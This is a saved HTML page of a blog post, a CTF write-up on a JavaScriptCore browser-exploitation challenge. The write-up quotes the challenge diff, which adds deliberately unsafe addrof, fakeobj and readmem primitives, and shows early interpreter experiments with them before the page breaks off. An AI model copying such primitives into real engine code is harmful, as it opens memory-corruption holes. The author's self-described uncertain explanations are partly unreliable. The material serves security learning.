@@ -1,0 +1,617 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="Hugo 0.92.2" />
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="" />
+  <meta property="og:url" content="http://cavefxa.com/posts/firstandsecondbpwn/" />
+  <link rel="canonical" href="http://cavefxa.com/posts/firstandsecondbpwn/" /><link rel="alternate" type="application/atom+xml" href="http://cavefxa.com/index.xml" title="cavefxa: security research">
+
+  <script type="application/ld+json">
+  {
+      "@context" : "http://schema.org",
+      "@type" : "BlogPosting",
+      "mainEntityOfPage": {
+           "@type": "WebPage",
+           "@id": "http:\/\/cavefxa.com\/"
+      },
+      "articleSection" : "posts",
+      "name" : "FE-CTF (HackingFromEstonia) My First BrowserPwn",
+      "headline" : "FE-CTF (HackingFromEstonia) My First BrowserPwn",
+      "description" : "Introduction \u0026ldquo;My first browser pwn\u0026rdquo;, was a challenge I solved with the team HackingFromEstonia, during the physical on-site finals at Frederiksberg Slot, at the event FE-CTF hosted by FE (Danish Defence Intelligence Service).\nThe challenge is created around the JavaScriptCore (JSC). The JSC is the JavaScript engine, used by WebKit implementations such as Safari, BlackBerry browser, Kindle e-book, and more. Note that it\u0026rsquo;s not the same as V8, which is developed by Google, whereas JSC is developed by Apple.",
+      "inLanguage" : "en-US",
+      "author" : "",
+      "creator" : "",
+      "publisher": "",
+      "accountablePerson" : "",
+      "copyrightHolder" : "",
+      "copyrightYear" : "2022",
+      "datePublished": "2022-12-12 17:17:45 \u002b0200 \u002b0200",
+      "dateModified" : "2022-12-12 17:17:45 \u002b0200 \u002b0200",
+      "url" : "http:\/\/cavefxa.com\/posts\/firstandsecondbpwn\/",
+      "keywords" : [  ]
+  }
+</script>
+<title>FE-CTF (HackingFromEstonia) My First BrowserPwn</title>
+  <meta property="og:title" content="FE-CTF (HackingFromEstonia) My First BrowserPwn" />
+  <meta property="og:type" content="article" />
+  <meta property="og:description" content="Introduction &amp;ldquo;My first browser pwn&amp;rdquo;, was a challenge I solved with the team HackingFromEstonia, during the physical on-site finals at Frederiksberg Slot, at the event FE-CTF hosted by FE (Danish Defence Intelligence Service).
+The challenge is created around the JavaScriptCore (JSC). The JSC is the JavaScript engine, used by WebKit implementations such as Safari, BlackBerry browser, Kindle e-book, and more. Note that it&amp;rsquo;s not the same as V8, which is developed by Google, whereas JSC is developed by Apple." />
+  <meta name="description" content="Introduction &amp;ldquo;My first browser pwn&amp;rdquo;, was a challenge I solved with the team HackingFromEstonia, during the physical on-site finals at Frederiksberg Slot, at the event FE-CTF hosted by FE (Danish Defence Intelligence Service).
+The challenge is created around the JavaScriptCore (JSC). The JSC is the JavaScript engine, used by WebKit implementations such as Safari, BlackBerry browser, Kindle e-book, and more. Note that it&amp;rsquo;s not the same as V8, which is developed by Google, whereas JSC is developed by Apple." />
+  <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
+  
+
+  
+    <style>body{font-family:bree serif,sans-serif;-webkit-font-smoothing:antialiased;margin:0 20px}article{max-width:900px;margin-left:auto;margin-right:auto}a{color:#000;text-decoration:none}a:hover{font-weight:600;text-decoration:underline}.post-ads{margin:50px 0}.markdown-body{font-size:18px;max-width:100%}.markdown-body a{text-decoration:underline;text-decoration-color:#000}.markdown-body blockquote{margin:0;padding:0 1em;color:#57606a;border-left:.25em solid #d0d7de}.markdown-body pre{padding:16px;overflow:auto;border-radius:10px}.markdown-body code{padding:.2em .4em;font-size:85%;background-color:#f6f8fa;border-radius:6px}.markdown-body pre>code{padding:0;font-size:100%;background-color:inherit;border:0}.Chinese .markdown-body{line-height:200%}.site-date-catalog{font-size:2rem}.header-title{font-size:2rem;font-weight:700;margin-top:32px;font-family:bungee shade,sans-serif}.header-title a{text-decoration:none}.header-subtitle{color:#666}.header-items{margin:10px 0}.header-item{margin:0 5px}.header-line{width:100%;border-width:2px;border-color:#482936;border-style:solid none none none}.lang-switch{font-weight:600}#posts-list{min-height:600px}.posts-line{font-size:1.2rem;margin:12px 0}.posts-categories{font-size:.8rem;margin:auto;text-align:center}.posts-category{padding:3px 0;border:#000 2px solid;border-radius:5px}.site-footer{margin-top:50px}.site-footer-item{margin-right:12px}.post-content img{max-width:100%;display:block;margin-right:auto;margin-top:12px}.post-header{margin-bottom:50px}.post-title{font-size:2rem;font-weight:600}.post-tags{display:inline;font-weight:600;padding:2px 5px;margin-right:6px;border:#000 2px solid;border-radius:5px}.post-date{font-weight:800;font-style:italic}.post-author{float:right;font-weight:600}.page-content{min-height:60%}.post-content{margin-bottom:50px}.post-content p{hyphens:auto;line-height:1.8;text-justify:ideographic;margin-bottom:1em}.related-content{border-width:3px;border-style:solid;border-color:#000;padding:0 10px;margin-bottom:50px;margin-top:100px}.related-content li{margin:5px 0}.taxonomy-term{font-size:3rem}.gallery-img{text-align:center}.gallery-img span{text-align:center}.gallery-img-desc{font-size:.8em;font-weight:800}#disqus_thread{position:relative}#disqus_thread:after{content:"";display:block;height:55px;width:100%;position:absolute;bottom:0;background:#fff}@media screen and (max-width:600px){.header-title,.header-subtitle,.header-items{text-align:center}.posts-line{font-size:16px}.markdown-body{font-size:16px}.post-title{font-size:2rem}.post-content p{letter-spacing:.05em}}@media screen and (max-width:48em){.posts-category{display:none}}</style>
+  
+  
+    <style>.container,.container-fluid{margin-right:auto;margin-left:auto}.container-fluid{padding-right:2rem;padding-left:2rem}.row{box-sizing:border-box;display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-flex:0;-ms-flex:0 1 auto;flex:initial;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-direction:row;flex-direction:row;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-.5rem;margin-left:-.5rem}.row.reverse{-webkit-box-orient:horizontal;-webkit-box-direction:reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse}.col.reverse{-webkit-box-orient:vertical;-webkit-box-direction:reverse;-ms-flex-direction:column-reverse;flex-direction:column-reverse}.col-xs,.col-xs-1,.col-xs-10,.col-xs-11,.col-xs-12,.col-xs-2,.col-xs-3,.col-xs-4,.col-xs-5,.col-xs-6,.col-xs-7,.col-xs-8,.col-xs-9,.col-xs-offset-0,.col-xs-offset-1,.col-xs-offset-10,.col-xs-offset-11,.col-xs-offset-12,.col-xs-offset-2,.col-xs-offset-3,.col-xs-offset-4,.col-xs-offset-5,.col-xs-offset-6,.col-xs-offset-7,.col-xs-offset-8,.col-xs-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-xs{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-xs-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-xs-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-xs-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-xs-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-xs-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-xs-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-xs-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-xs-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-xs-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-xs-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-xs-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-xs-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-xs-offset-0{margin-left:0}.col-xs-offset-1{margin-left:8.33333333%}.col-xs-offset-2{margin-left:16.66666667%}.col-xs-offset-3{margin-left:25%}.col-xs-offset-4{margin-left:33.33333333%}.col-xs-offset-5{margin-left:41.66666667%}.col-xs-offset-6{margin-left:50%}.col-xs-offset-7{margin-left:58.33333333%}.col-xs-offset-8{margin-left:66.66666667%}.col-xs-offset-9{margin-left:75%}.col-xs-offset-10{margin-left:83.33333333%}.col-xs-offset-11{margin-left:91.66666667%}.start-xs{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-xs{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-xs{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-xs{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-xs{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-xs{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-xs{-ms-flex-pack:distribute;justify-content:space-around}.between-xs{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-xs{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-xs{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}@media only screen and (min-width:48em){.container{width:49rem}.col-sm,.col-sm-1,.col-sm-10,.col-sm-11,.col-sm-12,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-offset-0,.col-sm-offset-1,.col-sm-offset-10,.col-sm-offset-11,.col-sm-offset-12,.col-sm-offset-2,.col-sm-offset-3,.col-sm-offset-4,.col-sm-offset-5,.col-sm-offset-6,.col-sm-offset-7,.col-sm-offset-8,.col-sm-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-sm{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-sm-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-sm-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-sm-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-sm-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-sm-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-sm-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-sm-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-sm-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-sm-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-sm-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-sm-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-sm-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-sm-offset-0{margin-left:0}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-11{margin-left:91.66666667%}.start-sm{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-sm{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-sm{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-sm{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-sm{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-sm{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-sm{-ms-flex-pack:distribute;justify-content:space-around}.between-sm{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-sm{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-sm{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:64em){.container{width:65rem}.col-md,.col-md-1,.col-md-10,.col-md-11,.col-md-12,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-offset-0,.col-md-offset-1,.col-md-offset-10,.col-md-offset-11,.col-md-offset-12,.col-md-offset-2,.col-md-offset-3,.col-md-offset-4,.col-md-offset-5,.col-md-offset-6,.col-md-offset-7,.col-md-offset-8,.col-md-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-md{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-md-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-md-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-md-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-md-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-md-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-md-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-md-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-md-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-md-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-md-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-md-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-md-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-md-offset-0{margin-left:0}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-3{margin-left:25%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-6{margin-left:50%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-9{margin-left:75%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-11{margin-left:91.66666667%}.start-md{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-md{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-md{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-md{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-md{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-md{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-md{-ms-flex-pack:distribute;justify-content:space-around}.between-md{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-md{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-md{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}@media only screen and (min-width:75em){.container{width:76rem}.col-lg,.col-lg-1,.col-lg-10,.col-lg-11,.col-lg-12,.col-lg-2,.col-lg-3,.col-lg-4,.col-lg-5,.col-lg-6,.col-lg-7,.col-lg-8,.col-lg-9,.col-lg-offset-0,.col-lg-offset-1,.col-lg-offset-10,.col-lg-offset-11,.col-lg-offset-12,.col-lg-offset-2,.col-lg-offset-3,.col-lg-offset-4,.col-lg-offset-5,.col-lg-offset-6,.col-lg-offset-7,.col-lg-offset-8,.col-lg-offset-9{box-sizing:border-box;-webkit-box-flex:0;-ms-flex:0 0 auto;flex:none;padding-right:.5rem;padding-left:.5rem}.col-lg{-webkit-box-flex:1;-ms-flex-positive:1;flex-grow:1;-ms-flex-preferred-size:0;flex-basis:0;max-width:100%}.col-lg-1{-ms-flex-preferred-size:8.33333333%;flex-basis:8.33333333%;max-width:8.33333333%}.col-lg-2{-ms-flex-preferred-size:16.66666667%;flex-basis:16.66666667%;max-width:16.66666667%}.col-lg-3{-ms-flex-preferred-size:25%;flex-basis:25%;max-width:25%}.col-lg-4{-ms-flex-preferred-size:33.33333333%;flex-basis:33.33333333%;max-width:33.33333333%}.col-lg-5{-ms-flex-preferred-size:41.66666667%;flex-basis:41.66666667%;max-width:41.66666667%}.col-lg-6{-ms-flex-preferred-size:50%;flex-basis:50%;max-width:50%}.col-lg-7{-ms-flex-preferred-size:58.33333333%;flex-basis:58.33333333%;max-width:58.33333333%}.col-lg-8{-ms-flex-preferred-size:66.66666667%;flex-basis:66.66666667%;max-width:66.66666667%}.col-lg-9{-ms-flex-preferred-size:75%;flex-basis:75%;max-width:75%}.col-lg-10{-ms-flex-preferred-size:83.33333333%;flex-basis:83.33333333%;max-width:83.33333333%}.col-lg-11{-ms-flex-preferred-size:91.66666667%;flex-basis:91.66666667%;max-width:91.66666667%}.col-lg-12{-ms-flex-preferred-size:100%;flex-basis:100%;max-width:100%}.col-lg-offset-0{margin-left:0}.col-lg-offset-1{margin-left:8.33333333%}.col-lg-offset-2{margin-left:16.66666667%}.col-lg-offset-3{margin-left:25%}.col-lg-offset-4{margin-left:33.33333333%}.col-lg-offset-5{margin-left:41.66666667%}.col-lg-offset-6{margin-left:50%}.col-lg-offset-7{margin-left:58.33333333%}.col-lg-offset-8{margin-left:66.66666667%}.col-lg-offset-9{margin-left:75%}.col-lg-offset-10{margin-left:83.33333333%}.col-lg-offset-11{margin-left:91.66666667%}.start-lg{-webkit-box-pack:start;-ms-flex-pack:start;justify-content:flex-start;text-align:start}.center-lg{-webkit-box-pack:center;-ms-flex-pack:center;justify-content:center;text-align:center}.end-lg{-webkit-box-pack:end;-ms-flex-pack:end;justify-content:flex-end;text-align:end}.top-lg{-webkit-box-align:start;-ms-flex-align:start;align-items:flex-start}.middle-lg{-webkit-box-align:center;-ms-flex-align:center;align-items:center}.bottom-lg{-webkit-box-align:end;-ms-flex-align:end;align-items:flex-end}.around-lg{-ms-flex-pack:distribute;justify-content:space-around}.between-lg{-webkit-box-pack:justify;-ms-flex-pack:justify;justify-content:space-between}.first-lg{-webkit-box-ordinal-group:0;-ms-flex-order:-1;order:-1}.last-lg{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}</style>
+  
+
+  
+
+  <link href="/index.xml" rel="alternate" type="application/rss+xml"
+    title="cavefxa: security research">
+  
+  <link rel="preconnect" href="https://fonts.gstatic.com">
+  <link href="https://fonts.googleapis.com/css?family=Bree+Serif|Bungee+Shade" rel="stylesheet">
+  
+  
+
+  
+  
+</head>
+
+
+<body>
+  <article class="post " id="article">
+    <div class="row">
+      <div class="col-xs-12">
+        <div class="site-header">
+          
+<header>
+  <div class="header-title">
+    <a href="/"
+      >cavefxa</a
+    >
+  </div>
+  <div class="header-subtitle"></div>
+</header>
+<div class="row end-md center-xs header-items">
+  
+  <div class="header-item">
+    <a href="/about" target="_blank">About Me</a>
+  </div>
+  
+</div>
+<div class="row end-xs">
+   
+</div>
+<div class="header-line"></div>
+
+        </div>
+        <header class="post-header">
+          <h1 class="post-title">FE-CTF (HackingFromEstonia) My First BrowserPwn</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2022-12-12 17:17:45 &#43;0200">
+                12 Dec 2022
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <h2 id="introduction">Introduction</h2>
+<p>&ldquo;My first browser pwn&rdquo;, was a challenge I solved with the team HackingFromEstonia, during the physical on-site finals at Frederiksberg Slot, at the event FE-CTF hosted by FE (Danish Defence Intelligence Service).</p>
+<p>The challenge is created around the JavaScriptCore (JSC). The JSC is the JavaScript engine, used by WebKit implementations such as Safari, BlackBerry browser, Kindle e-book, and more. Note that it&rsquo;s not the same as V8, which is developed by Google, whereas JSC is developed by Apple. Without further ado, let&rsquo;s get into the challenge. As this is my first browser pwn chall, all theory in this write-up can not be taken 100% for granted, even though I did my best to research what I&rsquo;m writing, to ensure it&rsquo;s true.</p>
+<h2 id="learning-about-jsc">Learning about JSC</h2>
+<p>When I began the first browser pwn challenge, I had no idea what JSC was, and how it worked, so I started playing around with it. We&rsquo;re given a <code>.tar</code> file, and upon extracting the contents we see three files:</p>
+<pre tabindex="0"><code>chal.diff  jsc  libJavaScriptCore.so.1
+</code></pre><p>Let&rsquo;s start from and end with <code>chal.diff</code>. This is a <code>diff</code> file, which is a type of text file that contains the differences between two versions of the same file or two different files. We see a lot of +&rsquo;s which indicate what has been added to this specific version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  <span style="color:#ae81ff">9</span> <span style="color:#f92672">+</span>static JSC_DECLARE_HOST_FUNCTION(functionFakeObj);
+ <span style="color:#ae81ff">10</span> <span style="color:#f92672">+</span>static JSC_DECLARE_HOST_FUNCTION(functionReadMemory);
+<span style="color:#f92672">...</span>
+ <span style="color:#ae81ff">18</span> <span style="color:#f92672">+</span>        addFunction(vm, <span style="color:#e6db74">&#34;print&#34;</span>, functionPrintStdOut, <span style="color:#ae81ff">1</span>);
+ <span style="color:#ae81ff">19</span> <span style="color:#f92672">+</span>        addFunction(vm, <span style="color:#e6db74">&#34;addrof&#34;</span>, functionAddressOf, <span style="color:#ae81ff">1</span>);
+ <span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span>        addFunction(vm, <span style="color:#e6db74">&#34;fakeobj&#34;</span>, functionFakeObj, <span style="color:#ae81ff">1</span>);
+ <span style="color:#ae81ff">21</span> <span style="color:#f92672">+</span>        addFunction(vm, <span style="color:#e6db74">&#34;readmem&#34;</span>, functionReadMemory, <span style="color:#ae81ff">1</span>);
+<span style="color:#f92672">...</span>
+ <span style="color:#ae81ff">51</span> <span style="color:#f92672">+</span>JSC_DEFINE_HOST_FUNCTION(functionFakeObj, (JSGlobalObject<span style="color:#f92672">*</span>, CallFrame<span style="color:#f92672">*</span> callFrame))
+ <span style="color:#ae81ff">52</span> <span style="color:#f92672">+</span>{
+ <span style="color:#ae81ff">53</span> <span style="color:#f92672">+</span>    JSValue value <span style="color:#f92672">=</span> callFrame<span style="color:#f92672">-&gt;</span>argument(<span style="color:#ae81ff">0</span>);
+ <span style="color:#ae81ff">54</span> <span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">!</span>value<span style="color:#f92672">.</span>isDouble())
+ <span style="color:#ae81ff">55</span> <span style="color:#f92672">+</span>        <span style="color:#66d9ef">return</span> JSValue::encode(jsUndefined());
+ <span style="color:#ae81ff">56</span> <span style="color:#f92672">+</span>
+ <span style="color:#ae81ff">57</span> <span style="color:#f92672">+</span>    uint64_t valueAsUint <span style="color:#f92672">=</span> bitwise_cast<span style="color:#f92672">&lt;</span>uint64_t<span style="color:#f92672">&gt;</span>(value<span style="color:#f92672">.</span>asDouble());
+ <span style="color:#ae81ff">58</span> <span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> JSValue::encode((JSCell<span style="color:#f92672">*</span>)valueAsUint);
+ <span style="color:#ae81ff">59</span> <span style="color:#f92672">+</span>}
+ <span style="color:#ae81ff">60</span> <span style="color:#f92672">+</span>
+ <span style="color:#ae81ff">61</span> <span style="color:#f92672">+</span>JSC_DEFINE_HOST_FUNCTION(functionReadMemory, (JSGlobalObject<span style="color:#f92672">*</span>, CallFrame<span style="color:#f92672">*</span> callFrame))
+ <span style="color:#ae81ff">62</span> <span style="color:#f92672">+</span>{
+ <span style="color:#ae81ff">63</span> <span style="color:#f92672">+</span>    JSValue value <span style="color:#f92672">=</span> callFrame<span style="color:#f92672">-&gt;</span>argument(<span style="color:#ae81ff">0</span>);
+ <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span>    <span style="color:#66d9ef">if</span> (<span style="color:#960050;background-color:#1e0010">!</span>value<span style="color:#f92672">.</span>isDouble())
+ <span style="color:#ae81ff">65</span> <span style="color:#f92672">+</span>        <span style="color:#66d9ef">return</span> JSValue::encode(jsUndefined());
+ <span style="color:#ae81ff">66</span> <span style="color:#f92672">+</span>
+ <span style="color:#ae81ff">67</span> <span style="color:#f92672">+</span>    uint64_t valueAsUint <span style="color:#f92672">=</span> bitwise_cast<span style="color:#f92672">&lt;</span>uint64_t<span style="color:#f92672">&gt;</span>(value<span style="color:#f92672">.</span>asDouble());
+ <span style="color:#ae81ff">68</span> <span style="color:#f92672">+</span>    uint64_t valueAtAddress <span style="color:#f92672">=</span> (int64_t)(<span style="color:#f92672">*</span>(int64_t<span style="color:#f92672">*</span>)valueAsUint);
+ <span style="color:#ae81ff">69</span> <span style="color:#f92672">+</span>    <span style="color:#66d9ef">return</span> JSValue::encode(jsNumber(bitwise_cast<span style="color:#f92672">&lt;</span>double<span style="color:#f92672">&gt;</span>(valueAtAddress)));
+ <span style="color:#ae81ff">70</span> <span style="color:#f92672">+</span>}
+</code></pre></div><p>In the challenge description we&rsquo;re told that all we need to pwn a browser is the two primitives, addrof, and  fakeobj. They&rsquo;re nice however, to provide us readmem, so we don&rsquo;t have to create our own memory leak function for this one. After some playing around with dependencies, I finally could run the jsc binary. Prompted with something looking like an interpreter I began playing around:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>
+<span style="color:#ae81ff">4</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#34;Hello world&#34;</span>)
+<span style="color:#a6e22e">Hello</span> <span style="color:#a6e22e">world</span>
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">bar</span><span style="color:#f92672">-</span><span style="color:#a6e22e">foo</span>
+<span style="color:#ae81ff">20</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span>
+</code></pre></div><p>Seems like we can write classic JavaScript. However we&rsquo;re more interested in finding out how the functions like <code>addrof()</code>, <code>readmem()</code>, and <code>fakeobj()</code> works.</p>
+<p>The addrof function in JSC seems to be used to get the address of an object. It takes an object as an argument and returns a numerical address as its result. The addrof function is useful for debugging and is often used to obtain information about objects in the JavaScript memory.</p>
+<p>Cool! Interesting, let&rsquo;s try that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+<span style="color:#ae81ff">20</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;hello&#34;</span>
+<span style="color:#a6e22e">hello</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">foo</span>)
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">bar</span>)
+<span style="color:#ae81ff">6.9320293351942</span><span style="color:#a6e22e">e</span><span style="color:#f92672">-</span><span style="color:#ae81ff">310</span>
+</code></pre></div><p>So we see that it returns undefined for a primitive value like 20, this is most likely because it&rsquo;s not stored the same place, the string seems to be.  It&rsquo;s also given as a float, instead of the usual pwn hexadecimal.</p>
+<p>The fakeobj function in JSC seems to be used to create a JavaScript object from a given set of properties. It takes an object as an argument and returns a new object that has the same properties as the original object. This is useful for creating a prototype object or for creating custom objects with specific properties. Let&rsquo;s play around with that:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">foo</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;deadbeef&#34;</span>
+<span style="color:#66d9ef">undefined</span>
+<span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">bar</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">foo</span>))
+<span style="color:#66d9ef">undefined</span>
